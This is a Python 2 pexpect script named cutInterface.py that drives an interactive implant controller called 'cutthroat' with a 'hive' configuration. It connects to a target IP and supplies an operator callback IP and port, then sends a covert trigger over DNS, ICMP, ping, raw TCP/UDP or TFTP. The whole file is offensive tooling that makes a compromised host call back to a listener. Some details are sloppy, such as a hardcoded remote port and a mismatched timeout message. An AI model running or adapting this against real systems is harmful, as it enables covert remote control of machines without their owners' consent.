#!/usr/bin/python

import pexpect, sys, os
from datetime import datetime

#print len(sys.argv)
if len(sys.argv) == 1:
	callbackIP = "10.3.2.19"
	callbackPort = "8000"
	remoteIP = "10.2.9.6" 
	triggerProtocol = "dns-request"
else:
	#Get input parameters...
	callbackIP = raw_input('What is your callback IP address? ')
	callbackPort = raw_input('What is your callback port? ')
	remoteIP = raw_input('What is the remote target IP address? ')
	triggerProtocol = raw_input('Which trigger protocol [dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq]? ')
	if triggerProtocol == "raw-udp":
		remotePort =  raw_input('What remote port will you be using? ')
	elif triggerProtocol == "raw-tcp":
		remotePort =  raw_input('What remote port will you be using? ')


#Delete the file if it exists now for convenience...
if os.path.isfile(remoteIP):
	print "\n\n\n Deleting file " + remoteIP + " for now...       Use this later to decide how to proceed!!\n\n\n"
	os.remove(remoteIP)

#Starts cutthroat and displays the initial startup
commandLine="./cutthroat ./hive"
print "Trying to spawn "+commandLine
cutT = pexpect.spawn(commandLine)
now=datetime.now()
fileName="cutthroat_terminal_"+now.strftime('%Y%m%d_%H%M%S.')+"log"
fout = file(fileName, 'w')
cutT.logfile=fout
index = cutT.expect( ['> ', pexpect.EOF, pexpect.TIMEOUT] , timeout=10 )


if index == 0:
	print "Matched >"
	print cutT.before
	print cutT.after
elif index == 1:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 2:
	print "Timeout of 10 occurred"
        print cutT.before
        print cutT.after

#send connection
#connection='ilm connect 10.2.9.6'
connection='ilm connect '+remoteIP
cutT.sendline(connection)

index = cutT.expect( ['\? ', pexpect.EOF, pexpect.TIMEOUT] , timeout=10 )
if index == 0:
	print cutT.before
elif index == 1:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 2:
	print "Timeout of 10 occurred"
        print cutT.before
        print cutT.after
#cutT.sendline('  10.3.2.19')    #callback address
cutT.sendline('  '+callbackIP)    #callback address

index = cutT.expect( ['\? ', pexpect.EOF, pexpect.TIMEOUT] , timeout=10 )
if index == 0:
	print cutT.before
elif index == 1:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 2:
	print "Timeout of 10 occurred"
        print cutT.before
        print cutT.after
#cutT.sendline("  8000")        #callback port
cutT.sendline('  '+callbackPort)        #callback port

index = cutT.expect( ['\?   ', pexpect.EOF, pexpect.TIMEOUT] , timeout=10 )
if index == 0:
	print cutT.before
elif index == 1:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 2:
	print "Timeout of 10 occurred"
        print cutT.before
        print cutT.after
#cutT.sendline("  10.2.9.6")    #remote IP Address
cutT.sendline('  '+remoteIP)    #remote IP Address

index = cutT.expect( [ '\? ', pexpect.EOF, pexpect.TIMEOUT ] , timeout=10 )
if index == 0:
	print cutT.before
elif index == 1:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 2:
	print "Timeout of 10 occurred"
        print cutT.before
        print cutT.after
#cutT.sendline("  dns-request")
cutT.sendline('  '+triggerProtocol)

if (triggerProtocol == "raw-udp") or (triggerProtocol == "raw-tcp"):
	index = cutT.expect( [ '\? ', pexpect.EOF, pexpect.TIMEOUT ] , timeout=15 )
	if index == 0:
		print cutT.before
	elif index == 1:
		print "EOF occurred"
        	print cutT.before
        	print cutT.after
	elif index == 2:
		print "Timeout of 15 occurred"
        	print cutT.before
        	print cutT.after
	cutT.sendline("  10000")
	#cutT.sendline('  '+remotePort)


index = cutT.expect( [' Trigger sent.', '> ', pexpect.EOF, pexpect.TIMEOUT] , timeout=20 )
if index == 0:
        print cutT.before
        print cutT.after
	now=datetime.now()
	print "      Sent on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
elif index == 1:
	print "Matched >, raw-tcp post on remote host could not be reached..."
        print cutT.before
        print cutT.after
elif index == 2:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
	print "Timeout of 200 occurred"
        print cutT.before
        print cutT.after

print "\n\n Waiting... \n\n"
index = cutT.expect( ['Success', 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=200 )

if index == 0:
        print "Good match of Success"
        print cutT.before
        print cutT.after
elif index == 1:
        print "Failure occurred"
        print cutT.before
        print cutT.after
elif index == 2:
        print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
        print "Timeout occurred. "
	now=datetime.now()
	print "      Trigger Timed out on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
        print cutT.before
        print cutT.after


print "\n\n End of cutInterface.py\n\n"



